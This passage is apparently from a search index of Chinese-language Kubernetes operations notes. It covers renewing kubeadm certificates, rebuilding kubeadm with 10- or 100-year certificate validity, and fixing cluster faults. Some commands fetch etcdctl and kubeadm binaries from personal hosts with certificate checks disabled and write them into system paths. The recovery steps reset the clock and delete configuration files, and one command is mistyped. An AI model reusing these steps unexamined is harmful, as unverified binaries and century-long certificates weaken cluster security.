\u7528\u4e8e\u5355\u72ec\u6d4b\u8bd5\u751f\u6210\u7b7e\u540d\u8bc1\u4e66\n#   https://books.8ops.top/attachment/cert-manager/certificate-dnspod-qqshfox.yaml \n#   https://books.8ops.top/attachment/cert-manager/ingress-dnspod-qqshfox.yaml\n#\n\nhelm upgrade --install cert-manager-webhook-dnspod-qqshfox ./cert-manager-webhook-dnspod-qqshfox \\\n    --namespace cert-manager \\\n    -f cert-manager-webhook-dnspod-qqshfox.yaml \\\n    --debug\n\n# \u81ea\u52a8\u751f\u6210\n# kubectl apply -f certificate-dnspod-qqshfox.yaml\n\n# Ingress \u4e2d secret \u7b7e\u53d1\nkubectl apply -f ingress-dnspod-qqshfox.yaml\n\n# uninstall\nhelm -n cert-manager uninstall cert-manager-webhook-dnspod-qqshfox\n\n# \u6ce8\u610f\n# \u5f53\u96c6\u7fa4\u4e2d\u6709\u4e24\u4e2a dnspod webhook \u65f6\n# \u4e24\u4e2a webhook \u7684 groupName \u4e0d\u80fd\u76f8\u540c\n# \u4f46 certificate \u5fc5\u987b\u548c cert-manager \u4e00\u81f4\uff0c\u9ed8\u8ba4\u662f cert-manager.io\n</code></pre> <p>dns-self-check</p>"},{"location":"kubernetes/05-helm/#523-smallstep","title":"5.2.3 smallstep","text":"<p>Reference</p>"},{"location":"kubernetes/05-helm/#nginx","title":"\u516d\u3001Nginx","text":"<pre><code>helm repo add bitnami https://charts.bitnami.com/bitnami\nhelm repo update bitnami\nhelm search repo nginx\n\nhelm show values bitnami/nginx &gt; nginx.yaml-default\n\nhelm install prometheus-sd  \\\n    -f nginx.yaml bitnami/nginx \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 12.0.6 --debug\n\n\nhelm -n kube-server uninstall prometheus-sd\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/","title":"Renew certs","text":""},{"location":"kubernetes/06-cluster-renew-certs/#_1","title":"\u4e00\u3001\u7eed\u7b7e\u8fc7\u7a0b","text":"<p>Reference</p>"},{"location":"kubernetes/06-cluster-renew-certs/#11","title":"1.1 \u67e5\u770b\u8bc1\u4e66\u8fc7\u671f\u65f6\u95f4","text":"<pre><code>kubeadm certs check-expiration\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#12","title":"1.2 \u5907\u4efd\u8bc1\u4e66","text":"<pre><code>ls /etc\nls /etc/kubernetes\n\ncp -r /etc/kubernetes /etc/kubernetes-$(date +%Y%m%d)\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#13","title":"1.3 \u66f4\u65b0\u8bc1\u4e66","text":"<pre><code># \u6bcf\u4e2acontrol-plane\u8282\u70b9\nkubeadm certs renew all\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#14","title":"1.4 \u91cd\u542f\u7ec4\u4ef6","text":"<pre><code># You must restart the kube-apiserver, kube-controller-manager, kube-scheduler and etcd\n\n# \u9759\u6001\u5bb9\u5668 \n#   ls /etc/kubernetes/manifests/\n#   etcd.yaml  kube-apiserver.yaml  kube-controller-manager.yaml  kube-scheduler.yaml\n\n# \u67e5\u770b\u72b6\u6001\nkubectl -n kube-system get po -w\n\nmv /etc/kubernetes/manifests /etc/kubernetes/manifests-$(date +%Y%m%d)\n# sleep 60s\nmv /etc/kubernetes/manifests-$(date +%Y%m%d) /etc/kubernetes/manifests\n# Depercated\n# kubectl -n kube-system get po -o name | \\\n#   awk '/kube-apiserver|kube-controller|kube-scheduler|etcd/{printf(\"kubectl -n kube-system delete %s\\n\",$1)}' | sh\n\n# \u770b\u5bb9\u5668\u521b\u5efa\u65f6\u95f4\nwatch 'crictl ps -a | awk \"/kube-apiserver|kube-controller|kube-scheduler|etcd/\"'\n\n# \u91cd\u542fkube-proxy\nkubectl -n kube-system rollout restart ds kube-proxy\nkubectl -n kube-system rollout status  ds kube-proxy\n\n# \u91cd\u542fkubelet\n# systemctl status kubelet\n# kubelet \u8bc1\u4e66\u9ed8\u8ba4\u81ea\u52a8\u7b7e\u53d1\u4e86 /var/lib/kubelet/pki/kubelet-client-current.pem\nopenssl x509 -noout -dates -in /var/lib/kubelet/pki/kubelet-client-current.pem\nsystemctl restart kubelet\n\n# \u901a\u8fc7 prometheus \u83b7\u53d6 ETCD \u6570\u636e\n# kubectl -n kube-server rollout restart deployment.apps/prometheus-server\nkubectl -n kube-server delete secret generic etcd-certs\nkubectl create secret generic etcd-certs \\\n  --from-file=/etc/kubernetes/pki/etcd/healthcheck-client.crt \\\n  --from-file=/etc/kubernetes/pki/etcd/healthcheck-client.key \\\n  --from-file=/etc/kubernetes/pki/etcd/ca.crt \\\n  -n kube-server\nkubectl -n kube-server get secret etcd-certs \\\n    -o jsonpath='{.data.healthcheck-client\\.crt}'| \\\n    base64 --decode | \\\n    openssl x509 -noout -dates  \nkubectl -n kube-server scale --replicas=0 deployment.apps/prometheus-server\nkubectl -n kube-server scale --replicas=1 deployment.apps/prometheus-server\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#15","title":"1.5 \u9a8c\u6536\u6548\u679c","text":"<pre><code># \u83b7\u53d6\u8282\u70b9\nkubectl get no \n\n# \u6838\u9a8c\u7ec4\u4ef6\u8bc1\u4e66\u7eed\u7b7e\u7ed3\u679c\nkubeadm certs check-expiration\n\n# \u67e5\u770b\u6240\u6709\u672c\u5730\u6587\u4ef6\u8bc1\u4e66\nfind /etc/kubernetes/pki -name '*.crt' | while read cert\ndo\nprintf \"\\nchecking [%-50s] [%s] \" ${cert} \"`openssl x509 -noout -enddate -in ${cert}`\"\ndone;echo\n\n# \u6838\u5b9e\u65b0\u7b7e\u53d1\u8bc1\u4e66\u540e\u8fdb\u884c\u7684\u91cd\u542fPod\napt install jq -y -q\nstat /etc/kubernetes/pki/apiserver-kubelet-client.crt | grep Modify\ncrictl inspect `crictl ps --name kube-scheduler -q` | jq .status.createdAt\n\n# \u67e5\u770bkubelet\u6700\u540e\u52a0\u8f7d\u65f6\u95f4\nsystemctl status kubelet\n\n# review etcd\nmkdir -p ~/bin\nwget --quiet --no-check-certificate https://m.8ops.top/linux/etcdctl-3.4.24 -O ~/bin/etcdctl\nchmod +x ~/bin/etcdctl\nexport PATH=~/bin:$PATH\netcdctl endpoint status -w table \\\n  --cluster \\\n  --cacert=/etc/kubernetes/pki/etcd/ca.crt \\\n  --cert=/etc/kubernetes/pki/etcd/server.crt \\\n  --key=/etc/kubernetes/pki/etcd/server.key\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#_2","title":"\u4e8c\u3001\u53d8\u66f4\u65f6\u957f","text":"<p>Reference</p>"},{"location":"kubernetes/06-cluster-renew-certs/#21-","title":"2.1 \u83b7\u53d6\u6e90\u7801-\u5206\u652f","text":"<pre><code>cd /opt\nKUBE_VERSION=1.25.0\nKUBE_VERSION=1.23.0\n\n# install git\napt update\napt install git -y\n\n# git clone\ngit clone https://github.com/kubernetes/kubernetes.git\n\n# \u5207\u6362\u7248\u672c\ncd kubernetes\ngit checkout v${KUBE_VERSION}\n# or git checkout remotes/origin/release-1.23\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#21-_1","title":"2.1 \u83b7\u53d6\u6e90\u7801-\u4e0b\u8f7d","text":"<pre><code>cd /opt\nKUBE_VERSION=1.25.0\nKUBE_VERSION=1.23.0\n\nwget https://github.com/kubernetes/kubernetes/archive/refs/tags/v${KUBE_VERSION}.tar.gz\ntar xzf v${KUBE_VERSION}.tar.gz -C .\n\ncd kubernetes-${KUBE_VERSION}\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#22","title":"2.2 \u4fee\u6539\u6e90\u7801","text":"<pre><code># v1.23.0\n\n# 100y\nsed -i '68 s/duration365d\\ \\*\\ 10/duration365d * 100/' staging/src/k8s.io/client-go/util/cert/cert.go\ngrep duration365d staging/src/k8s.io/client-go/util/cert/cert.go\n\nsed -i '50 s/time.Hour\\ \\*\\ 24\\ \\*\\ 365/time.Hour * 24 * 365 * 100/' cmd/kubeadm/app/constants/constants.go\ngrep CertificateValidity cmd/kubeadm/app/constants/constants.go\n\ngit diff .\n\n# 10y\nsed -i '50 s/time.Hour\\ \\*\\ 24\\ \\*\\ 365/time.Hour * 24 * 365 * 10/' cmd/kubeadm/app/constants/constants.go\ngrep CertificateValidity cmd/kubeadm/app/constants/constants.go\n\ngit diff .\n</code></pre> <pre><code># v1.25.0\n\n# 100y\nsed -i '80 s/duration365d\\ \\*\\ 10/duration365d * 100/' staging/src/k8s.io/client-go/util/cert/cert.go\ngrep duration365d staging/src/k8s.io/client-go/util/cert/cert.go\n\nsed -i '51 s/time.Hour\\ \\*\\ 24\\ \\*\\ 365/time.Hour * 24 * 365 * 100/' cmd/kubeadm/app/constants/constants.go\ngrep CertificateValidity cmd/kubeadm/app/constants/constants.go\n\ngit diff .\n\n# 10y\nsed -i '51 s/time.Hour\\ \\*\\ 24\\ \\*\\ 365/time.Hour * 24 * 365 * 10/' cmd/kubeadm/app/constants/constants.go\ngrep CertificateValidity cmd/kubeadm/app/constants/constants.go\n\ngit diff .\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#221","title":"2.2.1 \u6e90\u7801\u4e0a\u4e0b\u6587","text":"<p><code>vim ./staging/src/k8s.io/client-go/util/cert/cert.go</code></p> <pre><code>// \u8fd9\u4e2a\u65b9\u6cd5\u91cc\u9762 NotAfter:              now.Add(duration365d * 10).UTC()\n// \u9ed8\u8ba4\u6709\u6548\u671f\u5c31\u662f 10 \u5e74\uff0c\u6539\u6210 100 \u5e74 (sysin)\n// \u8f93\u5165 /NotAfter \u67e5\u627e\uff0c\u56de\u8f66\u5b9a\u4f4d\nfunc NewSelfSignedCACert(cfg Config, key crypto.Signer) (*x509.Certificate, error) {\n        now := time.Now()\n        tmpl := x509.Certificate{\n                SerialNumber: new(big.Int).SetInt64(0),\n                Subject: pkix.Name{\n                        CommonName:   cfg.CommonName,\n                        Organization: cfg.Organization,\n                },\n                NotBefore:             now.UTC(),\n                // NotAfter:              now.Add(duration365d * 10).UTC(),\n                NotAfter:              now.Add(duration365d * 100).UTC(),\n                KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature | x509.KeyUsageCertSign,\n                BasicConstraintsValid: true,\n                IsCA:                  true,\n        }\n\n        certDERBytes, err := x509.CreateCertificate(cryptorand.Reader, &amp;tmpl, &amp;tmpl, key.Public(), key)\n        if err != nil {\n                return nil, err\n        }\n        return x509.ParseCertificate(certDERBytes)\n}\n</code></pre> <p><code>vim ./cmd/kubeadm/app/constants/constants.go</code></p> <pre><code>// \u5c31\u662f\u8fd9\u4e2a\u5e38\u91cf\u5b9a\u4e49 CertificateValidity\uff0c\u6539\u6210 * 100 \u5e74 (sysin)\n// \u8f93\u5165 /CertificateValidity \u67e5\u627e\uff0c\u56de\u8f66\u5b9a\u4f4d\nconst (\n        // KubernetesDir is the directory Kubernetes owns for storing various configuration files\n        KubernetesDir = \"/etc/kubernetes\"\n        // ManifestsSubDirName defines directory name to store manifests\n        ManifestsSubDirName = \"manifests\"\n        // TempDirForKubeadm defines temporary directory for kubeadm\n        // should be joined with KubernetesDir.\n        TempDirForKubeadm = \"tmp\"\n\n        // CertificateValidity defines the validity for all the signed certificates generated by kubeadm\n        // CertificateValidity = time.Hour * 24 * 365\n        CertificateValidity = time.Hour * 24 * 365 * 100\n\n        // CACertAndKeyBaseName defines certificate authority base name\n        CACertAndKeyBaseName = \"ca\"\n        // CACertName defines certificate name\n        CACertName = \"ca.crt\"\n        // CAKeyName defines certificate name\n        CAKeyName = \"ca.key\"\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#23-","title":"2.3 \u7f16\u8bd1\u6e90\u7801-\u624b\u52a8","text":""},{"location":"kubernetes/06-cluster-renew-certs/#231","title":"2.3.1 \u914d\u7f6e\u73af\u5883","text":"<pre><code># \u67e5\u770b\u7f16\u8bd1\u4f9d\u8d56 Golang \u7248\u672c\ncat build/build-image/cross/VERSION\n\ncd /opt\nGO_VERSION=1.19   # v1.25\nGO_VERSION=1.17.3 # v1.23\nwget https://golang.google.cn/dl/go${GO_VERSION}.linux-amd64.tar.gz\ntar zxf go${GO_VERSION}.linux-amd64.tar.gz -C /usr/local\n\ncat &lt;&lt;EOF &gt; /etc/profile.d/go-env.sh\nexport GOROOT=/usr/local/go\nexport GOPATH=/usr/local/gopath\nexport PATH=\\$PATH:\\$GOROOT/bin\nEOF\nsource /etc/profile.d/go-env.sh\n\n# \u8fd9\u91cc\u4e00\u6b21\u6027\u7f16\u8bd1\uff0c\u76f4\u63a5\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5373\u53ef\nexport PATH=$PATH:/usr/local/go/bin\n\n# \u7f16\u8bd1 kubeadm, \u8fd9\u91cc\u4e3b\u8981\u7f16\u8bd1 kubeadm \u5373\u53ef\nmake all WHAT=cmd/kubeadm GOFLAGS=-v\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#23-_1","title":"2.3 \u7f16\u8bd1\u6e90\u7801-\u5bb9\u5668","text":""},{"location":"kubernetes/06-cluster-renew-certs/#231_1","title":"2.3.1 \u914d\u7f6e\u73af\u5883","text":"<p>\u7f16\u8bd1\u8981\u6c42</p> <pre><code># \u67e5\u770b kube-cross \u7684 TAG \u7248\u672c\ncat build/build-image/cross/VERSION\n# v1.23.0-go1.19.6-bullseye.0\n\nyum install -y -q rsync docker-ce\n\n# \u914d\u7f6edocker\u4ee3\u7406\u4e0b\u8f7d\u6e90registry.k8s.io\u955c\u50cf\n[Service]\nEnvironment=\"HTTP_PROXY=http://proxy.example.com:8080/\"\nEnvironment=\"HTTPS_PROXY=http://proxy.example.com:8080/\"\nEnvironment=\"NO_PROXY=localhost,127.0.0.1,.8ops.top,*.8ops.top\"\nsystemctl daemon-reload\nsystemctl restart docker\n\nTAG_NAME=v1.23.0-go1.19.6-bullseye.0 \ndocker pull hub.8ops.top/google_containers/kube-cross:${TAG_NAME}\ndocker tag  hub.8ops.top/google_containers/kube-cross:${TAG_NAME} registry.k8s.io/build-image/kube-cross:${TAG_NAME}\n\ndocker version # 19.03+\ndocker buildx version\n\nbuild/run.sh make kubeadm KUBE_BUILD_PLATFORMS=linux/amd64\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#24","title":"2.4 \u7eed\u7b7e\u8fc7\u7a0b","text":"<pre><code>mv /usr/bin/kubeadm{,-$(kubeadm version -o short)}\n\ncurl -k -s -o /usr/bin/kubeadm https://filestorage.8ops.top/ops/kubeadm/kubeadm-v1.25.0.amd64-10y\nchmod +x /usr/bin/kubeadm\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#_3","title":"\u4e09\u3001\u756a\u5916\u7bc7","text":""},{"location":"kubernetes/06-cluster-renew-certs/#31","title":"3.1 \u7ec4\u4ef6\u8bc1\u4e66\u5df2\u7ecf\u8fc7\u671f","text":"<p>\u4e07\u4e00\u4e0d\u5de7\u8bc1\u4e66\u771f\u7684\u8fc7\u671f\u4e86\uff0c\u5728\u7f51\u4e0a\u770b\u6709\u795e\u64cd\u4f5c\u89e3\u6551\u3002</p> <p>\u73b0\u8c61</p> <pre><code># \u8fde\u63a5 Api-server \u5931\u8d25\uff0c\u62a5\u8bc1\u4e66\u5df2\u8fc7\u671f\u4e0d\u53ef\u7528\u3002\n$ kubectl get node,pod\nUnable to connect to the server: x509: certificate has expired or is not yet valid: current time 2023-01-31T16:55:27+08:00 is after 2023-01-16T04:47:34Z\n</code></pre> <p>\u6025\u6551\u5305</p> <pre><code># \u5927\u81f4\u601d\u8def\uff1a\n# \u5907\u4efd\u96c6\u7fa4\u914d\u7f6e (\u5f53\u8bc1\u4e66\u5230\u671f\u65f6\u662f\u65e0\u6cd5\u6267\u884c\u7684\u6b64\u6b65\u9aa4\u53ef\u8df3\u8fc7)\n# \u4f46\u53ef\u4ee5\u5229\u7528date\u547d\u4ee4\u5c06\u7cfb\u7edf\u65f6\u95f4\u8bbe\u7f6e\u5230\u8fc7\u671f\u524d\u3002\n\n# 1\uff0c\u5907\u4efd\u914d\u7f6e\ncp -r /etc/kubernetes /etc/kubernetes-$(date +%Y%m%d)\n\n# 2\uff0c\u53d8\u66f4\u7cfb\u7edf\u65f6\u95f4\u81f3\u8fc7\u671f\u524d\ndata -s \"2023-01-01\" || timedatectl set-time \"2023-01-01\"\n\n# 3\uff0c\u5bfc\u51fa\u539f\u59cb\u914d\u7f6e\u6587\u4ef6\uff08\u540e\u7eed\u4f1a\u7528\u5230\uff09\nkubectl -n kube-system get cm kubeadm-config -o yaml &gt; kubeadm-init-config.yaml\n\n# 4\uff0c\u67e5\u770b\u8bc1\u4e66\u76f8\u5173\u4fe1\u606f\uff08\u6b64\u65f6\u5e94\u8be5\u90fdinvalid\u72b6\u6001\uff09\nkubeadm certs check-expiration\n\n# 5\uff0c\u7eed\u7b7e\u7ec4\u4ef6\u8bc1\u4e66\nkubeadm certs renew all --config=kubeadm-init-config.yaml\n\n# 6\uff0c\u91cd\u542f\u7ec4\u4ef6\uff08\u542bkube-apiserver, kube-controller-manager, kube-scheduler and etcd\uff09\nmv /etc/kubernetes/manifests /etc/kubernetes/manifests-$(date +%Y%m%d)\nsleep 60s\nmv /etc/kubernetes/manifests-$(date +%Y%m%d) /etc/kubernetes/manifests\n\n# 7\uff0c\u67e5\u770b\u8bc1\u4e66\u76f8\u5173\u4fe1\u606f\uff08\u6b64\u65f6\u6062\u590d\u53ef\u7528\uff09\nkubeadm certs check-expiration\n\n# 8\uff0c\u91cd\u65b0\u751f\u6210\u914d\u7f6e\u6587\u4ef6\nrm -rf /etc/kubernetes/*.conf\nkubeadm init phase kubeconfig all --config=kubeadm-init-config.yaml\n\n# 9\uff0c\u6062\u590d\u65f6\u95f4\nntpdate -s ntp.aliyun.org\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#32-kubelet","title":"3.2 Kubelet \u5ba2\u6237\u7aef\u8bc1\u4e66\u8f6e\u6362\u5931\u8d25","text":"<p>Reference</p> <p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ckubeadm \u4f7f\u7528 <code>/etc/kubernetes/kubelet.conf</code> \u4e2d\u6307\u5b9a\u7684 <code>/var/lib/kubelet/pki/kubelet-client-current.pem</code> \u7b26\u53f7\u94fe\u63a5\u6765\u914d\u7f6e kubelet \u81ea\u52a8\u8f6e\u6362\u5ba2\u6237\u7aef\u8bc1\u4e66\u3002\u5982\u679c\u6b64\u8f6e\u6362\u8fc7\u7a0b\u5931\u8d25\uff0c\u4f60\u53ef\u80fd\u4f1a\u5728 kube-apiserver \u65e5\u5fd7\u4e2d\u770b\u5230\u8bf8\u5982 <code>x509: certificate has expired or is not yet valid</code> \u4e4b\u7c7b\u7684\u9519\u8bef\u3002\u8981\u89e3\u51b3\u6b64\u95ee\u9898\uff0c\u4f60\u5fc5\u987b\u6267\u884c\u4ee5\u4e0b\u6b65\u9aa4\uff1a</p> <ol> <li>\u4ece\u6545\u969c\u8282\u70b9\u5907\u4efd\u548c\u5220\u9664 <code>/etc/kubernetes/kubelet.conf</code> \u548c <code>/var/lib/kubelet/pki/kubelet-client*</code>\u3002</li> <li> <p>\u5728\u96c6\u7fa4\u4e2d\u5177\u6709 <code>/etc/kubernetes/pki/ca.key</code> \u7684\u3001\u6b63\u5e38\u5de5\u4f5c\u7684\u63a7\u5236\u5e73\u9762\u8282\u70b9\u4e0a \u6267\u884c <code>kubeadm kubeconfig user --org system:nodes --client-name system:node:$NODE &gt; kubelet.conf</code>\u3002 <code>$NODE</code> \u5fc5\u987b\u8bbe\u7f6e\u4e3a\u96c6\u7fa4\u4e2d\u73b0\u6709\u6545\u969c\u8282\u70b9\u7684\u540d\u79f0\u3002 \u624b\u52a8\u4fee\u6539\u751f\u6210\u7684 <code>kubelet.conf</code> \u4ee5\u8c03\u6574\u96c6\u7fa4\u540d\u79f0\u548c\u670d\u52a1\u5668\u7aef\u70b9\uff0c \u6216\u4f20\u9012 <code>kubeconfig user --config</code>\uff08\u6b64\u547d\u4ee4\u63a5\u53d7 <code>InitConfiguration</code>\uff09\u3002 \u5982\u679c\u4f60\u7684\u96c6\u7fa4\u6ca1\u6709 <code>ca.key</code>\uff0c\u4f60\u5fc5\u987b\u5728\u5916\u90e8\u5bf9 <code>kubelet.conf</code> \u4e2d\u7684\u5d4c\u5165\u5f0f\u8bc1\u4e66\u8fdb\u884c\u7b7e\u540d\u3002</p> </li> <li> <p>\u5c06\u5f97\u5230\u7684 <code>kubelet.conf</code> \u6587\u4ef6\u590d\u5236\u5230\u6545\u969c\u8282\u70b9\u4e0a\uff0c\u4f5c\u4e3a <code>/etc/kubernetes/kubelet.conf</code>\u3002</p> </li> <li> <p>\u5728\u6545\u969c\u8282\u70b9\u4e0a\u91cd\u542f kubelet\uff08<code>systemctl restart kubelet</code>\uff09\uff0c\u7b49\u5f85 <code>/var/lib/kubelet/pki/kubelet-client-current.pem</code> \u91cd\u65b0\u521b\u5efa\u3002</p> </li> <li> <p>\u624b\u52a8\u7f16\u8f91 <code>kubelet.conf</code> \u6307\u5411\u8f6e\u6362\u7684 kubelet \u5ba2\u6237\u7aef\u8bc1\u4e66\uff0c\u65b9\u6cd5\u662f\u5c06 <code>client-certificate-data</code> \u548c <code>client-key-data</code> \u66ff\u6362\u4e3a\uff1a</p> </li> </ol> <pre><code>client-certificate: /var/lib/kubelet/pki/kubelet-client-current.pem\nclient-key: /var/lib/kubelet/pki/kubelet-client-current.pem\n</code></pre> <ol> <li>\u91cd\u65b0\u542f\u52a8 kubelet\u3002</li> <li>\u786e\u4fdd\u8282\u70b9\u72b6\u51b5\u53d8\u4e3a <code>Ready</code>\u3002</li> </ol>"},{"location":"kubernetes/06-cluster-renew-certs/#33-kubectlrefused","title":"3.3 \u6267\u884ckubectl\u547d\u4ee4\u62a5Refused","text":"<p>\u73b0\u8c61</p> <pre><code>$ kubectl get cs\nThe connection to the server localhost:8080 was refused - did you specify the right host or port?\n</code></pre> <p>\u89e3\u51b3</p> <pre><code># \u539f\u56e0\uff1a\u5f53\u524d\u7528\u6237\u4e0b\u6ca1\u6709~/.kube/config\u6216\u8005\u4e0d\u5b58\u5728\u73af\u5883\u53d8\u91cf\n\n# \u65b9\u5f0f1.\u590d\u5236 /etc/kubernetes \u76ee\u5f55\u4e0b admin.conf \u6587\u4ef6\u5230 \u5f53\u524d\u7528\u6237\u5bb6\u76ee\u5f55\u4e0b /.kube/config\nmkdir -p $HOME/.kube\necho 'yes' |  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\nsudo chown $(id -u):$(id -g) $HOME/.kube/config\n\n# \u65b9\u5f0f2.\u4f7f\u7528 KUBECONFIG \u73af\u5883\u53d8\u91cf\u5305\u542b\u4e00\u4e2a kubeconfig \u6587\u4ef6\u5217\u8868\u3002\nexport  KUBECONFIG=/etc/kubernetes/admin.conf:~/.kube/devops.kubeconfig\n\n# \u65b9\u5f0f3.\u5728\u547d\u4ee4\u6267\u884c\u65f6\u4f7f\u7528--kubeconfig\u53c2\u6570\u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\nkubectl config --kubeconfig=/etc/kubernetes/admin.conf\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#34-mastercalico-node","title":"3.4 master\u8282\u70b9\u4e0acalico-node\u51c6\u5907\u72b6\u6001","text":"<p>\u73b0\u8c61</p> <pre><code>$ kubectl get pod -n kube-system calico-node-v52sv\n  # NAME                READY   STATUS    RESTARTS   AGE\n  # calico-node-v52sv   0/1     Running   0          31m\n\n$ kubectl describe pod -n kube-system calico-node-v52sv | grep \"not ready\"\n  # Warning  Unhealthy    33m (x2 over 33m)  kubelet  Readiness probe failed: calico/node is not ready: BIRD is not ready: Error querying BIRD: unable to connect to BIRDv4 socket: dial unix /var/run/calico/bird.ctl: connect: connection refused\n  # calico/node is not ready: BIRD is not ready: BGP not established with 192.168.12.107,192.168.12.109,192.168.12.223,192.168.12.224,192.168.12.225,192.168.12.226\n\n$ kubectl logs -f --tail 50  -n kube-system calico-node-v52sv | grep \"interface\"\n  # 2023-02-01 08:40:57.583 [INFO][69] monitor-addresses/startup.go 714: Using autodetected IPv4 address on interface br-b92e9270f33c: 172.22.0.1/16\n  # calico \u5bf9\u5e94\u7684 Pod \u542f\u52a8\u5931\u8d25\uff0c\u62a5\u9519\uff1a\n  # Number of node(s) with BGP peering established = 0\n</code></pre> <p>\u89e3\u51b3</p> <pre><code># \u539f\u56e0\uff1a\u7531\u4e8e\u8be5\u8282\u70b9\u4e0a\u5b89\u88c5\u4e86docker\u5e76\u521b\u5efa\u4e86\u5bb9\u5668\uff0cCalico \u9009\u62e9\u4e86\u6709\u95ee\u9898\u7684br\u7f51\u5361\uff0c\u5bfc\u81f4 calico-node \u7684 Pod \u4e0d\u80fd\u542f\u52a8\n\n# Calico \u63d0\u4f9b\u4e86 IP \u81ea\u52a8\u68c0\u6d4b\u7684\u65b9\u6cd5\uff0c\u9ed8\u8ba4\u662f\u4f7f\u7528\u7b2c\u4e00\u4e2a\u6709\u6548\u7f51\u5361\u4e0a\u7684\u7b2c\u4e00\u4e2a\u6709\u6548\u7684 IP \u5730\u5740\uff1a\nIP_AUTODETECTION_METHOD=first-found\n\n# \u8282\u70b9\u4e0a\u5e94\u8be5\u662f\u51fa\u73b0\u4e86\u6709\u95ee\u9898\u7684\u7f51\u5361\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u67e5\u770b\uff1a\nip link | grep br\n\n# ---\n# \u77e5\u8bc6\u6269\u5c55: calico-node daemonset \u9ed8\u8ba4\u7684\u7b56\u7565\u662f\u83b7\u53d6\u7b2c\u4e00\u4e2a\u53d6\u5230\u7684\u7f51\u5361\u7684 ip \u4f5c\u4e3a calico node \u7684ip, \u7531\u4e8e\u96c6\u7fa4\u4e2d\u7f51\u5361\u540d\u79f0\u4e0d\u7edf\u4e00\u6240\u4ee5\u53ef\u80fd\u5bfc\u81f4calico\u83b7\u53d6\u7684\u7f51\u5361IP\u4e0d\u5bf9, \u6240\u4ee5\u51fa\u73b0\u6b64\u79cd\u60c5\u51b5\u4e0b\u5c31\u53ea\u80fd IP_AUTODETECTION_METHOD \u5b57\u6bb5\u6307\u5b9a\u901a\u914d\u7b26\u7f51\u5361\u540d\u79f0\u6216\u8005IP\u5730\u5740\u3002\n\n# \u65b9\u6cd51.\u4fee\u6539 yaml \u914d\u7f6e\u6e05\u5355\u4e2d IP \u81ea\u52a8\u68c0\u6d4b\u65b9\u6cd5\uff0c\u5728 spec.containers.env \u4e0b\u6dfb\u52a0\u4ee5\u4e0b\u4e24\u884c\u3002\uff08\u63a8\u8350\uff09\n  - name: IP_AUTODETECTION_METHOD\n    value: \"interface=ens.*\"  # ens \u6839\u636e\u5b9e\u9645\u7f51\u5361\u5f00\u5934\u914d\u7f6e\n\n# \u65b9\u6cd52.\u5220\u9664\u6709\u95ee\u9898\u7684\u7f51\u5361\uff08\u63a8\u8350\uff09\uff0c\u5373\u6307\u5b9a\u7f51\u5361\u540d\u79f0\uff08br \u5f00\u5934\u7684\u95ee\u9898\u7f51\u5361\uff09\u5220\u9664\u3002\nifconfig br-b92e9270f33c down\n\n# \u65b9\u6cd53.\u5047\u5982\u73af\u5883\u4e0d\u4f9d\u8d56docker\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5378\u8f7ddocker, \u7136\u540e\u91cd\u542f\u7cfb\u7edf\u5373\u53ef\u3002\nsudo apt-get autoremove docker docker-ce docker-engine docker.io\n\nkubectl delete pod -n kube-system calico-node-v52sv\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#35-bridge","title":"3.5 \u52a0\u5165\u96c6\u7fa4\u65f6\u62a5bridge \u9519\u8bef","text":"<p>\u73b0\u8c61</p> <pre><code>[preflight] Some fatal errors occurred:\n  [ERROR FileContent--proc-sys-net-bridge-bridge-nf-call-iptables]: /proc/sys/net/bridge/bridge-nf-call-iptables does not exist\n[preflight] If you know what you are doing, you can make a check non-fatal with `--ignore-preflight-errors=...`\nerror execution phase preflight\n</code></pre> <p>\u89e3\u51b3</p> <pre><code># \u914d\u7f6e\n$ cat &lt;&lt;EOF | sudo tee /etc/modules-load.d/k8s.conf\nbr_netfilter\nEOF\n$ cat &lt;&lt;EOF | sudo tee /etc/sysctl.d/k8s.conf\nnet.ipv4.ip_forward = 1\nnet.bridge.bridge-nf-call-ip6tables = 1\nnet.bridge.bridge-nf-call-iptables = 1\nEOF\n$ modprobe br_netfilter &amp;&amp; sudo sysctl --system\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#36-kubenetpath-does-not-exist","title":"3.6 kubenet\u62a5<code>path does not exist</code>","text":"<p>\u73b0\u8c61</p> <pre><code>Jan 16 14:27:25 weiyigeek-226 kubelet[882231]: E0116 14:27:25.496423  882231 kubelet.go:2347] \"Container runtime network not ready\" networkReady=\"NetworkReady=false reason:NetworkPluginNotReady message:Network plugin returns e&gt;\nJan 16 14:27:26 weiyigeek-226 kubelet[882231]: E0116 14:27:26.482369  882231 file_linux.go:61] \"Unable to read config path\" err=\"path does not exist, ignoring\" path=\"/etc/kubernetes/manifests\"\n</code></pre> <p>\u89e3\u51b3</p> <pre><code># \u89e3\u51b3\u529e\u6cd5: \u68c0\u67e5 /etc/kubernetes/manifests \u76ee\u5f55\u662f\u5426\u5b58\u50a8\u53ca\u5176\u6743\u9650\nmkdir -vp /etc/kubernetes/manifests\n</code></pre>"},{"location":"kubernetes/06-cluster-renew-certs/#37-secret","title":"3.7 